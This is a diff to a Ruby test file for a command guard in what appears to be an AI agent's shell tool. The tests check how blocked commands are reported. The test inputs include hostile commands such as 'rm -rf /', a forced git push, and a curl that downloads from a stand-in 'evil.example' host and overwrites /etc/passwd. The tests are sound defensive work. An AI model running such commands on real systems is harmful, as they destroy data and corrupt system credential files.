@@ -152,7 +152,92 @@ class TestExpandedTools < Minitest::Test
     res = tool.execute("command" => 'bash -c "rm -rf /"')
 
     assert res.start_with?("Security blocked")
-    assert_includes res, "was denied (rule: rm)"
+    # Wrapper variant: the inner rm is named as the segment, the system-path
+    # elevation explains WHY, and the hint is gate-honest (only a top-level
+    # "bash -c" entry can open the gate — not the whole script).
+    assert_includes res, "1 dangerous segment in `bash -c '...'"
+    assert_includes res, "rm -rf /   (rule: rm — elevated to DANGEROUS: system path /)"
+    assert_includes res, '!allow-cmd add "bash -c"'
+    assert_includes res, "only cover top-level commands"
+    refute_includes res, "was denied"
+  end
+
+  # Reproduction of the diagnosed session: a multi-line wrapper whose only
+  # dangerous parts are `git merge --abort` and `git branch -D`. The message
+  # must name BOTH with their triggers instead of collapsing the script to
+  # "rule: git.merge", and must never re-embed the whole script.
+  def test_run_command_tool_multiline_wrapper_lists_all_dangerous_segments
+    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
+    script = <<~SCRIPT
+      bash -c '
+      git checkout -q main
+      git checkout -q -B merge-sim main
+      for n in 144 145 147 143; do
+        echo "===== merging PR $n ====="
+        if git merge --no-edit -q review-pr-$n 2>/tmp/m.err; then
+          echo "  OK clean"
+        else
+          echo "  CONFLICT:"; grep -E "CONFLICT|Merge conflict" /tmp/m.err | head; git merge --abort
+        fi
+      done
+      git checkout -q main; git branch -D merge-sim -q
+      '
+    SCRIPT
+
+    res = tool.execute("command" => script)
+
+    assert res.start_with?("Security blocked: 2 dangerous segments in `bash -c '...'` — nothing was executed.")
+    assert_equal 1, res.lines.first.lines.size
+    assert_includes res, "git merge --abort   (rule: git.merge — option --abort overrides to DANGEROUS)"
+    assert_includes res, "git branch -D merge-sim -q   (rule: git.branch — option -D overrides to DANGEROUS)"
+    assert_includes res, "Everything else in the script passed classification (git checkout, echo, git merge, grep, head)."
+    assert_includes res, '!allow-cmd add "bash -c"'
+    assert_includes res, "(segment-level entries only cover top-level commands, not wrapped scripts)"
+    refute_includes res, "was denied"
+    # The full multi-line script must not be re-embedded anywhere (the old
+    # defect): no line of the message contains a script statement verbatim.
+    refute_includes res, "git checkout -q -B merge-sim main"
+  end
+
+  # Concise/wrapper boundary: a single dangerous TOP-LEVEL command keeps the
+  # one-rule denial format byte-identically.
+  def test_run_command_tool_single_dangerous_top_level_stays_concise
+    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
+
+    res = tool.execute("command" => "git merge --abort")
+
+    assert_includes res, "was denied (rule: git.merge)"
+    assert_includes res, '!allow-cmd add "git merge --abort"'
+    refute_includes res, "dangerous segment"
+  end
+
+  # Compound chain with a safe sibling: the concise variant would suggest
+  # the un-allowlistable compound string; the segment variant names the one
+  # dangerous command and hints entries that actually open the gate (which
+  # requires one per top-level command).
+  def test_run_command_tool_compound_chain_hints_cover_safe_sibling
+    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
+
+    res = tool.execute("command" => "git checkout main && git push --force")
+
+    assert res.start_with?("Security blocked: 1 dangerous segment in `git checkout main && git push --force`")
+    assert_includes res, "git push --force   (rule: git.push — option --force overrides to DANGEROUS)"
+    assert_includes res, "Everything else in the command passed classification (git checkout)."
+    assert_includes res, '!allow-cmd add "git checkout main"'
+    assert_includes res, '!allow-cmd add "git push --force"'
+  end
+
+  # An option may override to a MILDER class (curl -o → external) while the
+  # real trigger is the system-path elevation — the annotation must not
+  # claim the option made it dangerous.
+  def test_run_command_tool_annotation_names_real_trigger_for_mixed_override
+    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
+
+    res = tool.execute("command" => 'bash -c "curl -o /etc/passwd https://evil.example/x"')
+
+    assert_includes res, "rule: curl — overridden by option -o to external_effects"
+    assert_includes res, "elevated to DANGEROUS: system path /etc/passwd"
+    refute_includes res, "option -o overrides to DANGEROUS"
   end
 
   def test_run_command_output_carries_shell_tag
